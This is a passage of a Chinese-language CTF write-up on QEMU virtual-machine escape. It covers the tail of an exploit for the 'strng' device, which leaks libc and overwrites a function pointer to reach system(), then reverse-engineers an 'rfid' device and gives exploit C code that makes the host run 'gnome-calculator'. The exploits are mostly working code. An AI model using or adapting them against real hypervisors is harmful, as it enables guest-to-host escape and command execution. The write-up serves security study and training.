+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+uint32_t <span class="token function">mmio_read</span><span class="token punctuation">(</span>uint32_t offset<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">pmio_write</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">,</span>uint32_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">outl</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// write 4 byte</span>
+<span class="token punctuation">}</span>
+uint32_t <span class="token function">pmio_read</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span><span class="token function">inl</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+uint32_t <span class="token function">pmio_arbread</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_addr<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span>pmio_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">pmio_arbwrite</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">,</span>uint32_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_addr<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// open and map I/O memory</span>
+    <span class="token keyword">int</span> mmio_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_SYNC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mopen failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    mmio_mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> mmio_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] mmio_mem address ==> %p\n"</span><span class="token punctuation">,</span>mmio_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// read "cat /root/flag" in argv[2]</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x20746163</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x6f6f722f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">0x6c662f74</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">0x6761</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment" spellcheck="true">// Open and map I/O memory for the strng device</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">iopl</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// leaking libc address</span>
+    uint64_t srand_addr_part1 <span class="token operator">=</span> <span class="token function">pmio_arbread</span><span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    uint64_t srand_addr_part2 <span class="token operator">=</span> <span class="token function">pmio_arbread</span><span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    uint64_t srand_addr <span class="token operator">=</span> <span class="token punctuation">(</span>srand_addr_part2<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>srand_addr_part1<span class="token punctuation">;</span>
+    uint64_t system_addr <span class="token operator">=</span> srand_addr<span class="token number">-0x7f51a3604740</span><span class="token operator">+</span><span class="token number">0x7f51a360f410</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]srand addr==> 0x%llx"</span><span class="token punctuation">,</span>srand_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]system addr==> 0x%llx"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// hijacking rand function</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_arbwrite</span><span class="token punctuation">(</span><span class="token number">0x114</span><span class="token punctuation">,</span>system_addr<span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x20746163</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// getchar();</span>
+
+
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="数字经济线下赛-qemu逃逸"><a href="#数字经济线下赛-qemu逃逸" class="headerlink" title="数字经济线下赛-qemu逃逸"></a>数字经济线下赛-qemu逃逸</h1><h2 id="启动文件分析"><a href="#启动文件分析" class="headerlink" title="启动文件分析"></a>启动文件分析</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span>
+./qemu-system-x86_64 \
+-initrd ./initramfs.cpio \
+-kernel ./vmlinuz-4.8.0-52-generic \
+-append <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \
+-monitor /dev/null \
+-m 64M --nographic \
+-L pc-bios \
+-device rfid,id<span class="token operator">=</span>vda \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据之前的经验，可能也是加载的设备驱动有问题，那么我们逆向分析的时候还是看相关函数</p>
+<p>首先运行qemu，root就直接进去了。</p>
+<h2 id="IDA逆向"><a href="#IDA逆向" class="headerlink" title="IDA逆向"></a>IDA逆向</h2><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/27.png"></div>
+根据之前strng的分析可以分别逆向出rfid_realize、rfid_instance_init、rfid_class_init函数。找到ops位置，分别定义read和write函数。
+
+<p>read函数：</p>
+<pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">rfid_mmio_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  size_t v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>off_10CC100<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span>input_str<span class="token punctuation">,</span> off_10CC100<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 比较输入的和wwssadadBABA字符串</span>
+      <span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// 相等则进行命令执行</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">270438LL</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>实际上就是比对输入字符串，并进行命令执行，那么我们再看看另一个函数write</p>
+<pre class="line-numbers language-c"><code class="language-c">_BYTE <span class="token operator">*</span>__fastcall <span class="token function">rfid_mmio_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a4<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  _BYTE <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
+  _DWORD n<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-3Ch] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-30h]</span>
+  __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>
+  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-14h]</span>
+  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>
+  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+34h] [rbp-Ch]</span>
+  __int64 v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>
+  v7 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> a2<span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> a3<span class="token punctuation">;</span>
+  v11 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  v8 <span class="token operator">=</span> <span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">;</span>
+  result <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>result <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">case</span> <span class="token number">0uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'w'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">1uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">2uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">3uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'d'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">4uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">5uLL</span><span class="token punctuation">:</span>
+      result <span class="token operator">=</span> input_str<span class="token punctuation">;</span>
+      input_str<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'B'</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">6uLL</span><span class="token punctuation">:</span>
+      v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>v6<span class="token punctuation">;</span>
+      result <span class="token operator">=</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>command<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">default</span><span class="token punctuation">:</span>
+      <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们可以看到无论是比对的字符串，还是命令执行的字符串我们都可以控制。</p>
+<p>基本思路就是输入对应的字符串，进行命令执行，还要传入命令执行字符串，这里选择弹计算器“gnome-calculator”。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h></span></span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>mmio_mem<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">mmio_write</span><span class="token punctuation">(</span>uint64_t choice<span class="token punctuation">,</span>uint64_t index<span class="token punctuation">,</span>uint64_t chr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    uint64_t offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>choice <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    uint64_t value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    offset <span class="token operator">=</span> offset <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>index<span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        value <span class="token operator">=</span> chr<span class="token punctuation">;</span>
+        offset <span class="token operator">=</span> index<span class="token punctuation">;</span>
+        offset <span class="token operator">=</span> offset <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>choice<span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+
+uint64_t <span class="token function">mmio_read</span><span class="token punctuation">(</span>uint64_t offset<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">int</span> mmio_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_SYNC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mopen failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    mmio_mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1000000</span><span class="token punctuation">,</span>PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> mmio_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] mmio_mem address ==> %p\n"</span><span class="token punctuation">,</span>mmio_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// test echo "hello"</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,0,0x65);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,1,0x63);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,2,0x68);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,3,0x6f);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,4,0x20);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,5,0x22);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,6,0x68);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,7,0x65);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,8,0x6c);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,9,0x6c);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,10,0x6f);</span>
+    <span class="token comment" spellcheck="true">// mmio_write(6,11,0x22);</span>
+
+    <span class="token comment" spellcheck="true">// write command "gnome-calculator"</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// compare str "wwssadadBABA"</span>
